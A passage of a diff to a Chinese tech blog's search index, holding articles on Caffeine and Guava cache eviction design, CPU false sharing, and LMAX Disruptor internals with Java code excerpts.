<span class="keyword">catch</span> (<span class="keyword">final</span> TimeoutException e)</span><br><span class="line">      &#123;</span><br><span class="line">        notifyTimeout(sequence.get());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> AlertException ex)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果任务停止，就退出</span></span><br><span class="line">        <span class="keyword">if</span> (!running.get())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable ex)</span><br><span class="line">      &#123;</span><br><span class="line">        exceptionHandler.handleEventException(ex, nextSequence, event);</span><br><span class="line">        sequence.set(nextSequence);</span><br><span class="line">        nextSequence++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">finally</span></span><br><span class="line">  &#123;</span><br><span class="line">    notifyShutdown();</span><br><span class="line">    <span class="comment">// 任务关闭</span></span><br><span class="line">    running.set(<span class="keyword">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>消费者在消费时候，需要判断其最大可消费的序列号，这个最大可消费序列号是通过 SequenceBarrier#waitFor 方法来实现的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">waitFor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> AlertException, InterruptedException, TimeoutException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    		<span class="comment">// 判断是否中断，如果中断就抛出异常，这样上层捕捉，就可以停止 BatchEventProcessor</span></span><br><span class="line">        checkAlert();</span><br><span class="line">				<span class="comment">// 根据不同的策略获取可用的序列</span></span><br><span class="line">        <span class="keyword">long</span> availableSequence = waitStrategy.waitFor(sequence, cursorSequence, dependentSequence, <span class="keyword">this</span>);</span><br><span class="line">				<span class="comment">// 可用序列比申请的序列小，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (availableSequence &lt; sequence)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> availableSequence;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 如果是单生产者，直接返回 availableSequence；对于多生产者判断是否可用，不可用返回sequence-1</span></span><br><span class="line">        <span class="keyword">return</span> sequencer.getHighestPublishedSequence(sequence, availableSequence);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://github.com/LMAX-Exchange/disruptor">https://github.com/LMAX-Exchange/disruptor</a></p>
+    <title>caffeine 缓存实现原理</title>
+    <url>/caffeine.html</url>
+    <content><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>我们知道 HashMap 可以作为进程内缓存，他不受外部系统影响，速度快。但是他不能像分布式缓存那样能够实时刷新，且本地内存有限，需要限定 HashMap 的容量范围，这就涉及到缓存淘汰问题。为了解决本地缓存的这些问题，Guava Cache 应运而生，他提供了异步刷新和 LRU 淘汰策略。Guava Cache 功能虽然强大，但是只是对 LRU 的一层封装，在复杂的业务场景下，LRU 淘汰策略显得力不从心。为此基于  W-TinyLFU(LFU+LRU算法的变种) 淘汰策略的进程内缓存 —— Caffeine Cache 诞生了。</p>
+<p>Caffeine 的设计实现来自于大量优秀的研究，SpringBoot2 和 Spring5 已经默认支持 Caffeine Cache 代替原来的 Guava Cache，足以见得  Caffeine Cache 的地位。</p>
+<p>本文将试着探究 Guava Cache 和 Caffeine Cache 的实现原理，重点讲解 Caffeine Cache 相比于 Guava Cache 有哪些优秀的设计和改动。本文研究的 caffeine 版本是 2.7.0，guava 版本是 27.1-jre。</p>
+<h2 id="二、缓存淘汰算法"><a href="#二、缓存淘汰算法" class="headerlink" title="二、缓存淘汰算法"></a>二、缓存淘汰算法</h2><p>因为本地内存非常有限，我们的进程内缓存必须是有界的，需要进行数据淘汰，将无效的数据驱逐。一个好的淘汰算法，决定了其命中率高低。下面会简单介绍一些常见的淘汰算法，以便于后续的深入讲解。</p>
+<h3 id="2-1-LFU"><a href="#2-1-LFU" class="headerlink" title="2.1 LFU"></a>2.1 LFU</h3><p>LFU（Least Frequently Used，最近最不常用）根据数据的访问频率，淘汰掉最近访问频率最低的数据，其核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。</p>
+<p>需要维护每个数据项的访问频率信息，每次访问都需要更新，这个开销是非常大的。</p>
+<p>LFU 能够很好地应对偶发性、周期性的批量操作，不会造成缓存污染。但是对于突发性的热点事件，比如外卖中午时候访问量突增、微博爆出某明星糗事就是一个突发性热点事件。当事件结束后，可能没有啥访问量了，但是由于其极高的访问频率，导致其在未来很长一段时间内都不会被淘汰掉。</p>
+<h3 id="2-2-LRU"><a href="#2-2-LRU" class="headerlink" title="2.2 LRU"></a>2.2 LRU</h3><p>LRU（Least recently used，最近最少使用）根据数据的访问记录，淘汰掉最近最少使用的数据，其核心思想是“如果数据最近被访问过，那么将来被访问的几率也更高”（时间局部性原理）。</p>
+<p>需要用 queue 来保存访问记录，可以用 LinkedHashMap 来简单实现一个基于 LRU 算法的缓存。</p>
+<p>当存在热点数据时，LRU的效率很好。但偶发性的、周期性的批量操作会导致LRU命中率急剧下降，缓存污染情况比较严重。</p>
+<h3 id="2-3-TinyLFU"><a href="#2-3-TinyLFU" class="headerlink" title="2.3 TinyLFU"></a>2.3 TinyLFU</h3><p>TinyLFU 顾名思义，轻量级LFU，相比于 LFU 算法用更小的内存空间来记录访问频率。</p>
+<p>TinyLFU 维护了近期访问记录的频率信息，不同于传统的 LFU 维护整个生命周期的访问记录，所以他可以很好地应对突发性的热点事件（超过一定时间，这些记录不再被维护）。这些访问记录会作为一个过滤器，当新加入的记录（New Item）访问频率高于将被淘汰的缓存记录（Cache Victim）时才会被替换。流程如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio7.svg?sanitize=true" alt="08c4cfb4641549d3fb651df6d21425c7.png"></p>
+<p>尽管维护的是近期的访问记录，但仍然是非常昂贵的，TinyLFU 通过 Count-Min Sketch 算法来记录频率信息，它占用空间小且误报率低，关于 Count-Min Sketch 算法可以参考论文：<a href="http://dimacs.rutgers.edu/~graham/pubs/papers/cmsoft.pdf">pproximating Data with the Count-Min Data Structure</a></p>
+<h3 id="2-4-W-TinyLFU"><a href="#2-4-W-TinyLFU" class="headerlink" title="2.4 W-TinyLFU"></a>2.4 W-TinyLFU</h3><p>W-TinyLFU 算法相比于 LRU 等算法，具有更高的命中率。下图是一个运行了 ERP 应用的数据库服务中各种算法的命中率，实验数据来源于 ARC 算法作者，更多场景的性能测试参见：<a href="https://github.com/ben-manes/caffeine/wiki/Efficiency">官网</a></p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/66CBD80A-A07E-48CC-8CA8-19FE4ED688FB.png" alt="fc0df0eba9c3b7485b30d498559d98ac.png"><br>（图片来源于：<a href="https://github.com/ben-manes/caffeine/wiki/Efficiency%EF%BC%89">https://github.com/ben-manes/caffeine/wiki/Efficiency）</a></p>
+<p>W-TinyLFU 算法是对 TinyLFU算法的优化，能够很好地解决一些稀疏的突发访问元素。在一些数目很少但突发访问量很大的场景下，TinyLFU将无法保存这类元素，因为它们无法在短时间内积累到足够高的频率，从而被过滤器过滤掉。W-TinyLFU 将新记录暂时放入 Window Cache 里面，只有通过 TinLFU 考察才能进入 Main Cache。大致流程如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio8.svg?sanitize=true" alt="394b28c7e161703b4630108f894f9ece.png"></p>
+<h2 id="三、缓存事务"><a href="#三、缓存事务" class="headerlink" title="三、缓存事务"></a>三、缓存事务</h2><p>为了实现缓存的过期策略，我们需要在访问数据的时候记录一系列信息，我们将该操作定义为<strong>缓存事务</strong>。</p>
+<p>对于一个实现了写后过期的缓存，需要在其 put 操作时，记录 entry 的写时间，后续通过这个 entry 写时间来判断其是否过期。对于一个实现了读后过期的缓存，需要在其 get 操作时记录 entry 的最后访问时间，后续通过 entry 的最后访问时间来判断其是否过期。对于一个实现了 LFU 淘汰策略的缓存，需要在每次 get 操作时记录 entry 的访问次数，后续通过 entry 的访问次数来判断其是否淘汰。为了便于后续的表述，对于这种为实现缓存的过期淘汰策略而做的一系列额外操作，我们将其定义为<strong>缓存事务</strong>。</p>
+<h2 id="四、guava-缓存"><a href="#四、guava-缓存" class="headerlink" title="四、guava 缓存"></a>四、guava 缓存</h2><p>guava 缓存提供了基于容量、时间、引用的过期策略。基于容量的实现是采用 LRU 算法。基于引用的实现是借助于 JVM GC，因为缓存的key被封装在WeakReference引用内，缓存的Value被封装在WeakReference或SoftReference引用内。</p>
+<p>为了减少读写缓存的并发问题，参考了 JDK1.7 版本的 ConcurrentHashMap，实现了分段锁机制来减少锁粒度。然而分段锁机制不是非常好的方案，JDK1.8 已经取消了 ConcurrentHashMap 的分段锁，采用的 CAS + synchronized，他只锁住数组的单个元素。关于 ConcurrentHashMap 在 JDK1.8  中的改进，这里不再展开。</p>
+<p>采用 LRU 过期策略，每个 Segment 维护三个 queue，writeQueue 、 accessQueue和recencyQueue。其中 recencyQueue 是记录 get 操作命中的，accessQueue 是记录 get 操作未命中的。recencyQueue 是无锁操作，需要保证线程安全。  值得注意的是，在高并发下，queue的竞争是比较激烈，guava 是在 每个 put/get 操作时记录到对应的 queue，这样增加了用户端的耗时。</p>
+<p>过期策略是在访问数据的时候，判断是否过期。这样做好处是不需要后台线程定期扫描，但增加了耗时和内存损耗（本该过期的数据没有及时过期）。</p>
+<h3 id="4-1-Guava-缓存的执行流程"><a href="#4-1-Guava-缓存的执行流程" class="headerlink" title="4.1 Guava 缓存的执行流程"></a>4.1 Guava 缓存的执行流程</h3><p>guava 的事务操作是在读取缓存时一起执行的，读取缓存操作流程如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio9.svg?sanitize=true" alt="ec637600e0c6833c9b23076f48e3487a.png"></p>
+<p>事务处理在读取缓存时同步进行，这样的好处是不需要后台线程定期扫描处理事务，保证数据的实时性，但会增加一定的耗时。</p>
+<h3 id="4-2-Guava-缓存中的事务处理"><a href="#4-2-Guava-缓存中的事务处理" class="headerlink" title="4.2 Guava 缓存中的事务处理"></a>4.2 Guava 缓存中的事务处理</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio10.svg?sanitize=true" alt="bbd76bb898c0e572a12de5d4ba0c2c37.png"></p>
+<p>采用 LRU 过期策略，每个 Segment 维护三个 queue，writeQueue 、 accessQueue和recencyQueue。用来实现不同情况的 LRU 淘汰策略。其中 recencyQueue 是<strong>记录 get 命中操作的</strong>，这是个多线程操作，Guava 通过线程安全的 recencyQueue 来记录，然后通过单线程批量 recencyQueue 将访问记录添加到非线程安全的 accessQueue，可以看出 recencyQueue <strong>起到缓冲的作用</strong>。  正因为 recencyQueue 是线程安全的，在 get 操作时又增加了并发竞争耗时（将 Entry 添加到 recencyQueue）。</p>
+<h2 id="五、caffeine-缓存"><a href="#五、caffeine-缓存" class="headerlink" title="五、caffeine 缓存"></a>五、caffeine 缓存</h2><p>相比于 Guava 缓存，采用了更加先进的过期策略 W-TinyLFU，通过 RingBuffer 缓存事务，并用后台进程批量处理事务。Caffeine 直接采用的是 ConcurrentHashMap，要知道 ConcurrentHashMap 在 JDK1.8 是有非常大的性能提升的。</p>
+<p>简单讲，Caffeine 是对 ConcurrentHashMap 进行封装，采用缓冲和后台线程批量处理事务，Caffeine 官方称其并发性能近视等于 ConcurrentHashMap。</p>
+<p>Caffeine 官方做了性能测试，其中 6 线程读 2 线程写吞吐量如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/7B9BF947-6252-46E6-B0B5-77DE828AD6FE.png" alt="f9487f4ff3617d4f5c8c80f3186cf8e8.png"><br>（图片来源于：<a href="https://github.com/ben-manes/caffeine/wiki/Benchmarks%EF%BC%89">https://github.com/ben-manes/caffeine/wiki/Benchmarks）</a></p>
+<p>可以看到 Caffeine 缓存吞吐量远超 Guava 缓存，其余场景性能测试详见：<a href="https://github.com/ben-manes/caffeine/wiki/Benchmarks">官网</a></p>
+<h3 id="5-1-基于-W-TinyLFU"><a href="#5-1-基于-W-TinyLFU" class="headerlink" title="5.1 基于 W-TinyLFU"></a>5.1 基于 W-TinyLFU</h3><p>前面已经提到了 W-TinyLFU 算法，Caffeine 采用 W-TinyLFU 算法来实现其淘汰策略。Caffeine 内部维护了三个 queue，分别为：</p>
+<ul>
+<li>access order queue，实现读后过期</li>
+<li>write order queue，实现写后过期</li>
+<li>Hierarchical TimerWheel，实现定时过期</li>
+</ul>
+<p>在大多数情况下，读操作远比写操作多，因此 Caffeine 为了提高读并发能力，采用分段策略，将 access order queue 分为三种，分别是 WindowDeque、ProbationDeque、ProtectedDeque。这三者关系如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio11.svg?sanitize=true" alt="d5044eb799b261357b0a4ce8f762989b.png"></p>
+<p>结合 W-TinyLFU 算法，可以得出记录从产生到淘汰的整个流程：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/57F8E049-C5CE-4538-A6C0-9F9D071D7BF7.png" alt="f575ccd5c3ee35ca692a41ee0faa5505.png"><br>（图片来源于：<a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html%EF%BC%89">http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html）</a></p>
+<p>新的记录会进入第一个 LRU，这个在 Caffeine 里是 WindowDeque。之后通过过滤器过滤，过滤器通过访问频率来实现过滤，只有高于将要淘汰数据的使用频率才能进入缓存。这个频率信息维护就是前面提到的 Count-Min Sketch 算法来实现的，具体是 FrequencySketch 类。</p>
+<h4 id="5-1-1-过期策略"><a href="#5-1-1-过期策略" class="headerlink" title="5.1.1 过期策略"></a>5.1.1 过期策略</h4><p>Caffeine 采用统一的过期时间，这样可以实现 O(1) 复杂度往队列里添加和取出记录。对于写后过期，维护一个写入顺序队列，对于读后过期，维护一个读顺序队列。值得注意的是，这些操作都是单线程异步执行的。</p>
+<h3 id="5-2-执行流程"><a href="#5-2-执行流程" class="headerlink" title="5.2 执行流程"></a>5.2 执行流程</h3><p>与 Guava 最大的不同就是，Caffeine 在读取缓存操作时，将<strong>事务提交到缓存异步批量处理</strong>，大致处理流程如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio12.svg?sanitize=true" alt="a90c9c637a6b76cf46f13d01815bcd86.png"></p>
+<h3 id="5-3-缓存区"><a href="#5-3-缓存区" class="headerlink" title="5.3 缓存区"></a>5.3 缓存区</h3><h4 id="5-3-1-readBuffer"><a href="#5-3-1-readBuffer" class="headerlink" title="5.3.1 readBuffer"></a>5.3.1 readBuffer</h4><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio13.svg?sanitize=true" alt="36ba91e8ba3b79918b10cdf7b9d17082.png"></p>
+<p>采用RingBuffer，有损。为了进一步减少读并发，采用多个 RingBuffer（striped ring buffer 条带环形缓冲），通过线程 id 哈希到对应的RingBuffer。环形缓存的一个显著特点是不需要进行 GC，直接通过覆盖过期数据。</p>
+<p>当一个 RingBuffer 容量满载后，会触发异步的执行操作，而后续的对该 ring buffer 的写入会被丢弃，直到这个 ring buffer 可被使用，因此 readBuffer 记录读缓存事务是有损的。因为读记录是为了优化驱策策略，允许他有损。</p>
+<h4 id="5-3-2-writeBuffer"><a href="#5-3-2-writeBuffer" class="headerlink" title="5.3.2 writeBuffer"></a>5.3.2 writeBuffer</h4><p>采用传统的有界队列 ArrayQueue，无损</p>
+<h3 id="5-4-状态机"><a href="#5-4-状态机" class="headerlink" title="5.4 状态机"></a>5.4 状态机</h3><p>缓冲区和细粒度的写带来了单个数据项的操作乱序的竞态条件。插入、读取、更新、删除都可能被各种顺序的重放，如果这个策略控制的不合适，则可能引起悬垂索引。解决方案是通过状态机来定义单个数据项的生命周期。这类似于 AQS 中的原子类型变量 state。</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio14.svg?sanitize=true" alt="7744cc0f1faa13cb71a53c2033fe495c.png"></p>
+<h3 id="5-5-事务处理"><a href="#5-5-事务处理" class="headerlink" title="5.5 事务处理"></a>5.5 事务处理</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio15.svg?sanitize=true" alt="4aa939e0c2bfc37f2463823eeeca80d7.png"></p>
+<h3 id="5-6-caffeine-get-操作流程图"><a href="#5-6-caffeine-get-操作流程图" class="headerlink" title="5.6 caffeine get 操作流程图"></a>5.6 caffeine get 操作流程图</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio16.svg?sanitize=true" alt="f07e7f28159908d5899cb36643be3c46.png"></p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio17.svg?sanitize=true" alt="4fe5bac0356b7e0baf8f181938b1bcde.png"></p>
+<h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><p><a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html">http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html</a></p>
+<p><a href="https://github.com/ben-manes/caffeine">https://github.com/ben-manes/caffeine</a></p>
+<p><a href="https://arxiv.org/pdf/1512.00727.pdf">TinyLFU: A Highly Eﬃcient Cache Admission Policy</a></p>
+<p><a href="http://dimacs.rutgers.edu/~graham/pubs/papers/cmsoft.pdf">Approximating Data with the Count-Min Data Structure</a></p>
+<p><a href="https://segmentfault.com/a/1190000016091569">https://segmentfault.com/a/1190000016091569</a></p>
+<p><a href="https://chuansongme.com/n/2254051">https://chuansongme.com/n/2254051</a></p>
 ]]></content>
       <categories>
-        <category>java</category>
+        <category>javaWeb</category>
       </categories>
       <tags>
         <tag>源码</tag>
-        <tag>disruptor</tag>
+        <tag>caffeine</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>伪共享</title>
+    <url>/false-sharing.html</url>
+    <content><![CDATA[<h3 id="伪共享"><a href="#伪共享" class="headerlink" title="伪共享"></a>伪共享</h3><p>在 cpu 和 内存之间有高速缓存区（cache）,cache 一般集成在 cpu 内部，也叫做 cpu Cache。如下图是一个二级缓存示意图。<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file.png" alt="二级缓存示意图"></p>
+<span id="more"></span>
+
+<p>cache 内部是按照行来存储的，每行称为一个 cache 行，大小为2的n次幂，一个 cache 行 可能会存有多个变量数据<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file2.png" alt="cache行"></p>
+<p>当多个线程同时修改一个 cache 行里面的多个变量时候，由于同时只能有一个线程操作缓存行，所以相比每个变量放到一个缓存行性能会有所下降，这就是伪共享。</p>
+<p>当单个线程顺序访问同一个 cache 行的多个变量，利用<strong>程序运行局部性原理</strong>会加快程序运行。当多个程序同时访问同一个 cache 行的多个变量，会发生竞争，速度会慢</p>
+]]></content>
+      <categories>
+        <category>java进阶</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>并发编程</tag>
       </tags>
   </entry>
   <entry>
@@ -419,71 +375,65 @@
       </tags>
   </entry>
   <entry>
-    <title>伪共享</title>
-    <url>/false-sharing.html</url>
-    <content><![CDATA[<h3 id="伪共享"><a href="#伪共享" class="headerlink" title="伪共享"></a>伪共享</h3><p>在 cpu 和 内存之间有高速缓存区（cache）,cache 一般集成在 cpu 内部，也叫做 cpu Cache。如下图是一个二级缓存示意图。<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file.png" alt="二级缓存示意图"></p>
+    <title>disrupt 实现原理</title>
+    <url>/disrupt.html</url>
+    <content><![CDATA[<h2 id="一、Disruptor-简介"><a href="#一、Disruptor-简介" class="headerlink" title="一、Disruptor 简介"></a>一、Disruptor 简介</h2><p>线程间通讯框架，实现多线程共享数据。是一个高性能无锁队列，由英国外汇交易公司 LMAX 开发。</p>
+<p>性能测试：<a href="https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results">https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results</a></p>
 <span id="more"></span>
 
-<p>cache 内部是按照行来存储的，每行称为一个 cache 行，大小为2的n次幂，一个 cache 行 可能会存有多个变量数据<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file2.png" alt="cache行"></p>
-<p>当多个线程同时修改一个 cache 行里面的多个变量时候，由于同时只能有一个线程操作缓存行，所以相比每个变量放到一个缓存行性能会有所下降，这就是伪共享。</p>
-<p>当单个线程顺序访问同一个 cache 行的多个变量，利用<strong>程序运行局部性原理</strong>会加快程序运行。当多个程序同时访问同一个 cache 行的多个变量，会发生竞争，速度会慢</p>
+<h2 id="二、Disruptor-为什么这么快"><a href="#二、Disruptor-为什么这么快" class="headerlink" title="二、Disruptor 为什么这么快"></a>二、Disruptor 为什么这么快</h2><h3 id="2-1-无锁操作"><a href="#2-1-无锁操作" class="headerlink" title="2.1 无锁操作"></a>2.1 无锁操作</h3><p>生产数据消费数据都是通过申请序列，申请成功后才可以继续操作。而申请序列的操作时通过 CAS + LockSupport 完成的。</p>
+<h3 id="2-2-消除伪共享"><a href="#2-2-消除伪共享" class="headerlink" title="2.2 消除伪共享"></a>2.2 消除伪共享</h3><p>通过填充数据方式来实现消除伪共享</p>
+<h4 id="2-2-1-什么是伪共享"><a href="#2-2-1-什么是伪共享" class="headerlink" title="2.2.1 什么是伪共享"></a>2.2.1 什么是伪共享</h4><p>cpu 三级缓存架构如下</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor.png" alt="cpu 三级缓存"></p>
+<p>thread1 和 thread2 读取数据会覆盖 cpu cache line</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor1.png" alt="伪共享"></p>
+<h4 id="2-2-2-通过数据填充消除伪共享"><a href="#2-2-2-通过数据填充消除伪共享" class="headerlink" title="2.2.2 通过数据填充消除伪共享"></a>2.2.2 通过数据填充消除伪共享</h4><p>通过填充数据，使数据长度恰好等于一个缓存行长度（64 字节 or 128 字节），这样数据占据整个缓存行，就不会被别的数据覆盖。</p>
+<p>Disruptor 中的 Sequence 序列号对象，通过先后数据填充，变为 128 个字节，实现伪共享消除的。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p1, p2, p3, p4, p5, p6, p7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span> <span class="keyword">extends</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">volatile</span> <span class="keyword">long</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RhsPadding</span> <span class="keyword">extends</span> <span class="title">Value</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p9, p10, p11, p12, p13, p14, p15;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sequence</span> <span class="keyword">extends</span> <span class="title">RhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> INITIAL_VALUE = -<span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe UNSAFE;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> VALUE_OFFSET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过前置p1<del>p7，后置p9</del>p15填充缓存行，防止缓冲行共享。一般的处理器架构缓存行是64字节，但是有个处理器架构是128字节，所以采用前后填充，能够实现在所有处理器上消除伪共享。</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor2.png" alt="缓存行"></p>
+<h3 id="2-3-环形-buffer"><a href="#2-3-环形-buffer" class="headerlink" title="2.3 环形 buffer"></a>2.3 环形 buffer</h3><p>内部采用数组存储数据，充分利用内存局部性原理。</p>
+<p>只使用一个指针来表示可用数据，没有头尾指针。消除头尾指针竞争。各个生产者消费者只需要申请自己的序列号，就可以进行操作了。不存在竞争同一资源。</p>
+<p>bufferSize 是 2 的 n 次幂，通过 sequence &amp; (2^n -1) 来计算索引。</p>
+<p>通过数据覆盖，不需要删除数据，无需 GC。</p>
+<h2 id="三、Disruptor-如何工作"><a href="#三、Disruptor-如何工作" class="headerlink" title="三、Disruptor 如何工作"></a>三、Disruptor 如何工作</h2><h3 id="3-1-消费者端"><a href="#3-1-消费者端" class="headerlink" title="3.1 消费者端"></a>3.1 消费者端</h3><p>每个消费者都对应一个 ConsumerBarrier，消费者通过 ConsumerBarrier 与 Disruptor 交互。消费者通过 ConsumerBarrier 获取下一个可以消费的序列号，然后开始消费。比如消费者 A 当前消费的序列号是8，通过 ConsumerBarrier 获取下一个可消费的序列号是 12，那么消费者 A 可以批量消费序列号 9，10，11，12 的数据。</p>
+<p><strong>消费者消费数据步骤：1.获取序列号，2.消费数据</strong></p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor3.png" alt="消费者消费步骤"></p>
+<h3 id="3-2-生产者端"><a href="#3-2-生产者端" class="headerlink" title="3.2 生产者端"></a>3.2 生产者端</h3><p>多个生产者对应一个 Sequencer，也就是说多个生产者共用一个序列号。</p>
+<p><strong>生产者生产数据步骤：1.申请序列号，2.填充数据，3.发布</strong></p>
+<p>生产者 A 和生产者 B <strong>同时生产</strong>数据，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor4.png" alt="生产者1"></p>
+<p>生产者 A <strong>讯轮阻塞</strong> 等待消费者 A，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor5.png" alt="生产者2"></p>
+<p>消费者 A <strong>轮训非阻塞</strong> 等待生产者 B，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor6.png" alt="生产者3"></p>
+<h2 id="四、源码导读"><a href="#四、源码导读" class="headerlink" title="四、源码导读"></a>四、源码导读</h2><h3 id="4-1-核心类"><a href="#4-1-核心类" class="headerlink" title="4.1 核心类"></a>4.1 核心类</h3><p><a href="https://github.com/LMAX-Exchange/disruptor/wiki/Introduction">https://github.com/LMAX-Exchange/disruptor/wiki/Introduction</a></p>
+<p>ringbuff上有指针，每个消费者都维护自己的一个指针，生产者共用一个指针。指针是由 Sequencer类来控制的假设buffsize=8，如果消费者在消费id7，生产者将生产id15（15-buffsize=7），是同一个位置，生产者阻塞，如果生产者在生产id7，消费者在消费id7，消费者阻塞</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/162762019.png" alt="流程图"></p>
+<h3 id="4-2-生产者端"><a href="#4-2-生产者端" class="headerlink" title="4.2 生产者端"></a>4.2 生产者端</h3><h4 id="4-2-1-申请序号"><a href="#4-2-1-申请序号" class="headerlink" title="4.2.1 申请序号"></a>4.2.1 申请序号</h4><p>调用 Sequencer#get ，直接看多生产者如果申请序号的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;n must be &gt; 0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> current;</span><br><span class="line">  <span class="keyword">long</span> next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取当前发布序号</span></span><br><span class="line">    current = cursor.get();</span><br><span class="line">    next = current + n;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">long</span> wrapPoint = next - bufferSize;</span><br><span class="line">    <span class="comment">// gatingSequenceCache 这是 gatingSequence 的缓存，存入的是最小的消费者消费序列（有多个消费者）</span></span><br><span class="line">    <span class="keyword">long</span> cachedGatingSequence = gatingSequenceCache.get();</span><br><span class="line">		<span class="comment">// 生产者要覆盖未被消费的数据（生产者超过消费者一圈了）</span></span><br><span class="line">    <span class="keyword">if</span> (wrapPoint &gt; cachedGatingSequence || cachedGatingSequence &gt; current)</span><br><span class="line">    &#123;</span><br><span class="line">      <span 